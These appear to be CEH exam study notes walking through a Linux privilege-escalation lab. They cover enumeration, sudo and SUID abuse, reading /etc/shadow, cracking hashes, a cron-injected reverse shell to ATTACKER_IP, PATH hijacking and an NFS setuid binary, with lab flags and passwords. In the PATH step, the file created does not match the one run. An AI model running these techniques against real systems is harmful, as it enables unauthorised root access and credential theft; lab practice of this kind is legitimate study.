# 🐧 Linux Privilege Escalation – FULL CEH PRACTICAL NOTES (DETAILED)

---

# 🧭 TARGET INFO (LAB)

```text
Target IP: 10.49.167.54
Users:
- karen (initial)
- missy (privilege escalation path)
- root (goal)
```

---

# 📌 TASK 3 – ENUMERATION (BASICS)

## 🖥️ SYSTEM ENUMERATION

### Commands used:

```bash
hostname
uname -a
cat /proc/version
cat /etc/issue
```

### Output:

```text
Hostname: wade7363
Kernel: 3.13.0-24-generic
OS: Ubuntu 14.04 LTS
Python: 2.7.6
Vulnerability: CVE-2015-1328
```

---

## 📊 PROCESS ENUMERATION

```bash
ps aux
ps -A
ps axjf
```

---

## 🌍 ENVIRONMENT ENUMERATION

```bash
env
echo $PATH
```

✔ Used for PATH hijacking later

---

## 👤 USER ENUMERATION

```bash
id
whoami
cat /etc/passwd
history
```

---

## 🌐 NETWORK ENUMERATION

```bash
ifconfig
ip route
netstat -ano
netstat -tulpn
```

---

## 🔍 FILE ENUMERATION

```bash
find . -name flag1.txt
find / -type f -perm -04000 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

---

# 📌 TASK 6 – SUDO PRIVILEGE ESCALATION

## CHECK SUDO RIGHTS

```bash
sudo -l
```

### OUTPUT:

```text
(ALL) NOPASSWD: /usr/bin/find
```

---

## 🚀 EXPLOIT 1 (GTFOBins – FIND)

```bash
sudo find . -exec /bin/bash \; -quit
```

✔ RESULT:

```bash
root shell (#)
```

---

## FLAG READ:

```bash
cat /home/rootflag/flag2.txt
```

```text
THM-168824782390238
```

---

## 🚀 EXPLOIT 2 (NMAP)

```bash
sudo nmap --interactive
!sh
```

✔ root shell

---

## HASH FOUND:

```text
frank hash:
$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv...
```

---

# 📌 TASK 7 – SUID ESCALATION

## FIND SUID FILES

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

---

## IMPORTANT OUTPUT:

```text
/usr/bin/base64
/usr/bin/passwd
/usr/bin/su
```

---

## EXPLOIT (BASE64)

```bash
/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
```

✔ OUTPUT: password hashes

---

## CRACK PASSWORD

```bash
nano hash.txt
john --format=crypt --wordlist=rockyou.txt hash.txt
```

---

## FLAG RESULT:

```text
flag3.txt = THM-3847834
user2 password = Password1
```

---

# 📌 TASK 8 – CAPABILITIES ESCALATION

## CHECK CAPABILITIES

```bash
getcap -r / 2>/dev/null
```

---

## OUTPUT:

```text
vim
view
```

---

## EXPLOIT (VIM ROOT SHELL)

```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

✔ ROOT ACCESS

---

## FLAG:

```text
THM-9349843
```

---

# 📌 TASK 9 – CRON JOB ESCALATION

## CHECK CRON FILE

```bash
cat /etc/crontab
```

---

## CHECK SCRIPTS

```bash
ls -la /etc/cron*
```

---

## MODIFIED SCRIPT (ATTACK)

```bash
nano backup.sh
```

### Inject payload:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## LISTENER:

```bash
nc -lvnp 4444
```

---

## RESULT:

```bash
ROOT SHELL OBTAINED
```

---

## FLAGS:

```text
flag5.txt = THM-383000283
Matt password = 123456
```

---

# 📌 TASK 10 – PATH HIJACKING

## CHECK PATH

```bash
echo $PATH
```

---

## FIND WRITABLE DIR

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
```

### OUTPUT:

```text
/home/murdoch
```

---

## EXPLOIT

```bash
export PATH=/home/murdoch:$PATH
```

---

## CREATE FAKE BINARY

```bash
echo "/bin/bash" > /home/murdoch/thm
chmod +x /home/murdoch/thm
```

---

## RUN TARGET PROGRAM

```bash
./test
```

✔ ROOT SHELL

---

## FLAG:

```text
THM-736628929
```

---

# 📌 TASK 11 – NFS ESCALATION

## CHECK SHARES

```bash
cat /etc/exports
showmount -e target-ip
```

---

## OUTPUT:

```text
3 mountable shares
no_root_squash enabled on all
```

---

## EXPLOIT FLOW:

### Mount share:

```bash
mount -t nfs target:/share /mnt
```

---

### Create exploit:

```c
#include <unistd.h>
int main(){
setuid(0);
setgid(0);
system("/bin/bash");
return 0;
}
```

---

### Compile:

```bash
gcc nfs.c -o nfs
chmod +s nfs
```

---

### Run on target:

```bash
./nfs
```

✔ ROOT SHELL

---

## FLAG:

```text
THM-89384012
```

---

# 📌 TASK 12 – CAPSTONE (FULL ATTACK FLOW)

## USER: leonard

```bash
ssh leonard@10.49.167.54
Password: Penny123
```

---

## STEP 1 – ENUMERATION

```bash
id
whoami
sudo -l
find / -name flag1.txt 2>/dev/null
```

### RESULT:

```text
flag1 = THM-42828719920544
```

---

## STEP 2 – PRIV ESC CHECKS

```bash
find / -perm -4000 2>/dev/null
find / -writable -type f 2>/dev/null
```

---

## STEP 3 – CHECK SUDO MISCONFIG

```bash
sudo -l
```

---

## STEP 4 – ROOT ESCALATION

```bash
sudo find . -exec /bin/bash \; -quit
```

✔ ROOT SHELL OBTAINED

---

## STEP 5 – FLAG 2

```bash
cat /home/rootflag/flag2.txt
```

```text
THM-168824782390238
```

---

# 🧠 FINAL CHEAT FLOW (EXAM USE)

## ALWAYS RUN:

```bash
hostname
uname -a
cat /etc/issue
id
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
echo $PATH
```

---

# ⚡ REAL CEH PRACTICAL STRATEGY

👉 Order matters:

1. Enumeration
    
2. SUID
    
3. Sudo
    
4. Cron
    
5. PATH
    
6. Capabilities
    
7. Kernel exploit
    
8. NFS
    

---

If you want next level prep, I can make:

🔥 “CEH PRACTICAL 1-PAGE SUPER CHEAT SHEET”  
🔥 “SIMULATED EXAM: I give box → you root it step-by-step”  
🔥 “ALL GTFOBins mapped for exam use”